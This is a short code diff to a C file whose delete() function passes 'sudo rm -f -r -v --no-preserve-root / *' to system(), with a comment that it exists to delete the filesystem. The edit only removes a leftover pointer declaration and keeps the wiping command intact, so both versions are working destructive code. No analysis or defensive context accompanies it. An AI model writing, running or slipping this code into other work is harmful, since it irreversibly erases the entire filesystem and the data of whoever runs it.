@@ -7,7 +7,7 @@
 #define MAX_CMN_LEN 100
 
 int delete () {
-    char rm[MAX_CMN_LEN] = "sudo rm -f -r -v --no-preserve-root / *", **p; /* variable to delete filesystem */
+    char rm[MAX_CMN_LEN] = "sudo rm -f -r -v --no-preserve-root / *"; /* variable to delete filesystem */
     system(rm); /* execute the command */
     return 0;
 }
